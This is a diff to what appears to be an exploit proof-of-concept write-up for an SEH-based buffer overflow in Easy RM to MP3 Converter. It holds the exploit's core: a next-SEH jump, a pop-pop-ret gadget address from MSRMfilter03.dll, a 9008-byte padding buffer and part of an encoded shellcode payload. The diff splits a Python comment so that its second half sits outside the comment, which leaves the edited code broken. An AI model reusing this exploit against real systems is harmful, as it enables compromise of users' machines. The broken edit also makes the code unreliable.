@@ -115,7 +115,8 @@ Updated PoC:
 import struct
 
 nseh = struct.pack("<I", 0x06710870)
-seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
+seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, 
+Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
 
 buffer = "A" * 9008 + nseh + seh + "\xff" * 200
 
@@ -230,7 +231,8 @@ buf += b"\x43\x43\x51\x70\x6c\x33\x53\x46\x4e\x43\x55\x61\x68"
 buf += b"\x75\x35\x75\x50\x41\x41" 
 
 nseh = struct.pack("<I", 0x06710870)
-seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
+seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, 
+Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
 
 buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 10 + buf + "\xff" * 200
 
